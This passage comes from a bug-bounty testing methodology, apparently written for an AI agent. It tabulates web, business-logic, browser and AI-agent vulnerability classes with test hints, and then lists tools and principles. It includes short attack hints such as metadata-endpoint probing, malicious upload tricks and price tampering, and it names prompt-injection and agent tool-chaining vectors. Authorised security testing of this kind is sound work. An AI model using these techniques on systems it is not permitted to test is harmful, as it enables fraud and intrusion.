| 38 | **Insecure Deserialization** | Java serialized objects, pickle | Test for serialized data; look for gadget chains | $2,000–$10,000 |
| 39 | **Subdomain Takeover** | CNAME to unclaimed service | Check DNS records for dangling CNAMEs | $500–$3,000 |
| 40 | **Open Redirect** | Redirect to attacker URL | Test `?next=`, `?redirect=`, `?return=` parameters | $300–$1,500 |
| 41 | **Clickjacking** | UI redressing | Check `X-Frame-Options`, `Content-Security-Policy` | $200–$1,000 |
| 42 | **Information Disclosure** | Stack traces, verbose errors | Trigger errors; check response headers | $200–$1,500 |
| 43 | **Credential Exposure** | Hardcoded keys in JS/config | Search JS files for `api_key`, `token`, `secret` | $500–$3,000 |
| 44 | **Certificate Validation** | Invalid TLS cert acceptance | Test with self-signed certs; check HSTS | $300–$1,000 |
| 45 | **Man-in-the-Middle** | Missing cert pinning | Test on network with proxy; check TLS config | $500–$2,000 |
| 46 | **File Upload Abuse** | Unrestricted uploads | Upload `.php.jpg`, double extensions, SVG with JS | $1,000–$5,000 |
| 47 | **Insufficient Logging** | Missing audit trails | Check if sensitive actions are logged | $200–$1,000 |

**Business Logic & Race Conditions:**
| # | Class | Example | Key Test | Avg Bounty |
|---|-------|---------|----------|------------|
| 48 | **Race Condition** | Double-spend, plan limit bypass | Send parallel requests with Turbo Intruder | $3,000–$10,000+ |
| 49 | **Business Logic Error** | Pricing bypass, feature abuse | Understand business flow; test edge cases | $500–$5,000 |
| 50 | **Mass Assignment** | Modify hidden fields via API | Add `role`, `isAdmin`, `balance` to POST body | $1,000–$5,000 |
| 51 | **Parameter Tampering** | Modify prices, quantities, IDs | Change numeric values: 0, -1, 999999999 | $500–$3,000 |
| 52 | **Step-Skipping** | Skip validation steps | Call step N+1 without completing step N | $500–$3,000 |
| 53 | **Request Replay** | Reuse requests across contexts | Capture request; replay in different session/cart | $500–$2,000 |
| 54 | **State Reset** | Cancel/recreate for infinite discounts | Test if history is tracked or only current state | $500–$2,000 |
| 55 | **Inventory Abuse** | Reserve stock with failed payment | Submit invalid payment; check stock release | $500–$2,000 |
| 56 | **Rate Limit Bypass** | Unlimited coupon generation | Send rapid sequential requests | $300–$1,500 |
| 57 | **Email Alias Abuse** | `user+N@` for multiple rewards | Test email normalization | $300–$1,000 |
| 58 | **Promotion Reactivation** | Flip expired voucher flags | Intercept requests; modify `voucherApplied` boolean | $500–$2,000 |
| 59 | **Legacy Endpoint Abuse** | Old API versions without validation | Test `/v1/` when `/v2/` is current | $500–$2,000 |
| 60 | **Client-Side Trust** | UI-enforced rules not server-enforced | Remove `disabled` attributes; bypass JS checks | $500–$2,000 |
| 61 | **Response Manipulation** | Flip feature flags in transit | Intercept responses; modify booleans | $500–$2,000 |
| 62 | **Third-Party API Trust** | External API accepts low-priv tokens | Replay tokens on external API privileged endpoints | $1,000–$5,000 |
| 63 | **Direct Balance Manipulation** | Modify amount without payment | Change `amount`, `threshold` in payment requests | $1,000–$5,000 |
| 64 | **Permission Model Modification** | Change role capabilities | Modify ACL/permission arrays instead of role ID | $1,000–$5,000 |
| 65 | **API Chaining** | Two harmless APIs = critical vuln | Chain leaked IDs with trusting endpoints | $1,000–$5,000 |

**AI/LLM & Modern Attack Vectors:**
| # | Class | Example | Key Test | Avg Bounty |
|---|-------|---------|----------|------------|
| 66 | **Prompt Injection** | Invisible ASCII-to-Unicode hidden text | Inject prompts via chat/widget/notes fields | $1,000–$5,000 |
| 67 | **AI Agent Tool Chaining** | DNS exfil via confused deputy | Map tools → chain data access + outbound connectivity | $2,000–$8,000 |
| 68 | **AI Agent C2 (Living Off AI)** | Natural language as C2 transport | Test if AI executes shell commands from prompts | $2,000–$10,000 |
| 69 | **Supply Chain Attack** | Dependency confusion, typosquatting | Test package registries; check for internal package names | $5,000–$20,000+ |
| 70 | **Cloud Metadata SSRF** | AWS/GCP/Azure credential exfil | Test `169.254.169.254` from app context | $3,000–$15,000+ |

**postMessage & Browser Security (ysamm.com):**
| # | Class | Example | Key Test | Avg Bounty |
|---|-------|---------|----------|------------|
| 71 | **postMessage Origin Bypass** | Sandbox null origin bypasses isSameOrigin | Send messages from sandboxed iframe; check null handling | $5,000–$20,000+ |
| 72 | **PRNG State Recovery** | Math.random() used for security tokens | Observe outputs, reconstruct state, predict future values | $10,000–$66,000 |
| 73 | **Parameter Pollution** | `param[0` replaces `param` server-side | Add indexed variants; test client/server desync | $5,000–$42,000 |
| 74 | **URI Path Injection** | Version parameter injects paths | Set version to `api/graphql?doc_id=X#` | $5,000–$42,000 |
| 75 | **HTML-to-PDF Abuse** | iframe file:// in PDF converter | Embed iframes with file://, about://, internal IPs | $1,000–$5,000 |
| 76 | **CSRF Proxy Endpoint** | `/proxy?url=` injects CSRF token | Find proxy endpoints that forward to arbitrary URLs | $2,000–$10,000 |
| 77 | **MessageChannel Trust Abuse** | Port accepted after weak origin check | Bypass origin check → receive port → send trusted messages | $5,000–$20,000+ |
| 78 | **Iframe Reinitialization** | Forced reinit leaks new random values | Send reinit messages; collect new iframe names/IDs | $5,000–$20,000+ |
| 79 | **Origin Registration Abuse** | Register attacker origin for trust | Register origin via xdArbiter; omit origin in subsequent messages | $5,000–$20,000+ |
| 80 | **Login/Logout CSRF Chain** | Session swap keeps iframe loaded | Chain login/logout CSRF; access non-refreshing iframe content | $5,000–$20,000+ |

---

## Tool Usage

### Browser (Playwright)
- `playwright_browser_run_code_unsafe`: Login, token extraction, multi-step flows
- `playwright_browser_evaluate`: Fast API calls with explicit tokens
- `playwright_browser_navigate`: Initial page load only
- `playwright_browser_snapshot`: Understand page structure
- `playwright_browser_network_requests`: Capture all API calls made by the page
- `playwright_browser_console_messages`: Check for errors, warnings, debug info

### Burp Suite
- `burp_send_http1_request`: Fast single-request testing
- `burp_create_repeater_tab_http2`: Persistent tabs for manual verification
- `burp_send_to_intruder`: Mass parameter testing
- `burp_generate_collaborator_payload`: Out-of-band detection
- `burp_get_collaborator_interactions`: Check for DNS/HTTP callbacks
- **Match and Replace**: Response manipulation (flip flags, modify values)
- **Send group in parallel**: Race condition testing
- **Repeater history**: Save valid requests for replay testing
- **Intruder with email aliases**: `user+1@`, `user+2@` pattern
- **Turbo Intruder**: High-speed race condition testing

### Scripts
- `js_hunt.py`: JavaScript analysis for hidden endpoints
- `bag.py`: Endpoint management and flow testing
- `dep_check.py`: Dependency confusion checks
- **nuclei**: CVE and vulnerability scanning
- **httpx**: Fast HTTP probing
- **katana**: Web crawler for endpoint discovery
- **gau** (GetAllUrls): Historical URL discovery
- **dalfox**: XSS scanning
- **sqlmap**: SQL injection testing
- **ffuf**: Fuzzing for directories, parameters, virtual hosts

### File Structure
```
test_results/
  business_model.txt    - Phase 0: What the business does
  flow_map.txt          - Phase 1: Business flow mapping
  trust_boundaries.txt  - Phase 2: Trust boundary analysis
  api_tests.txt         - Phase 3: API testing results
  findings.json         - Phase 4: Validated findings
  endpoint_catalog.json - All discovered endpoints
  third_party_versions.txt - Software versions, CVE checks
  replay_requests.txt   - Saved requests for replay testing
  race_condition_tests/ - Parallel request test results
  ai_agent_tests/       - AI/LLM interaction logs
```

---

## Speed Principles

1. **One flow per feature** — Map the business logic, don't click everything
2. **Business first, code second** — Understand WHY before HOW
3. **Skip steps intentionally** — That's where the bugs are
4. **Direct API calls** — Don't trust the UI
5. **Kill early** — Bad leads waste time
6. **Chain, don't list** — One primitive is nothing, two is impact
7. **Test concurrency** — Race conditions are real bugs
8. **Manipulate responses** — If the UI trusts it, test flipping it
9. **Replay requests** — Can a valid request work in a different context?
10. **Normalize inputs** — Does the system treat `user+1@` and `user+2@` as different?
11. **Check third-party versions** — Known CVEs in infrastructure = easy wins
12. **Reactivate expired things** — Promotions, vouchers, trials that "expired"
13. **Inject restricted items** — Can I add things that shouldn't be addable?
14. **Test old endpoints** — Legacy APIs often skip validation
15. **Reset state** — Cancel, recreate, get "first time" benefits again
16. **Race limits** — Parallel requests bypass count checks
17. **Fail payments** — Does stock release when payment fails?
18. **Test token revocation** — Are old tokens invalidated on role changes?
19. **Brute-force IDs** — Sequential IDs may expose outdated data/prices
20. **Repeat reward endpoints** — Are there per-user limits?
21. **Test parameter ranges** — Can I set values outside UI limits?
22. **Test external APIs separately** — They may not enforce the same auth
23. **Modify authorization model** — Change what roles can do, not who you are
24. **Test financial parameters directly** — Can I modify amounts without payment?
25. **Test AI agent boundaries** — Can I chain tools or inject prompts?
26. **Check supply chain** — Are dependencies vulnerable to confusion?
27. **Test cloud metadata paths** — Can the app reach `169.254.169.254`?
28. **Fuzz with null/empty/arrays** — Edge cases in JSON parsing
29. **Switch HTTP methods** — POST might hit a different backend than GET
30. **Test mobile endpoints separately** — Mobile APIs often have weaker protections

---

## The Meta-Principle

**Every bug is a business rule that the code doesn't enforce.**

Your job is to:
1. Understand the business rule
2. Find where the code should enforce it
3. Test if the code actually does
4. If not, you've found the bug

The technical exploitation is just proof. The vulnerability is the gap between business intent and code behavior.

**Sources:**
- [Un-ease/hackerone-reports-extractor](https://github.com/Un-ease/hackerone-reports-extractor) — 11,158 HackerOne reports processed into 41 bug classes
- [ajaysenr/HackerOne-Disclosed-Reports](https://github.com/ajaysenr/HackerOne-Disclosed-Reports) — 9,823 disclosed reports with metadata
- [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) — Curated top reports by type and program
- [ysamm.com](https://ysamm.com/) — Youssef Sammouda (sam0) Facebook/Meta bug bounty writeups ($126,000+ in bounties)
- HackerOne "Rise of the Bionic Hacker" 2025 Report — AI vulnerability trends
- OWASP Top 10 2025 — Supply chain (#3) and race conditions (#10)
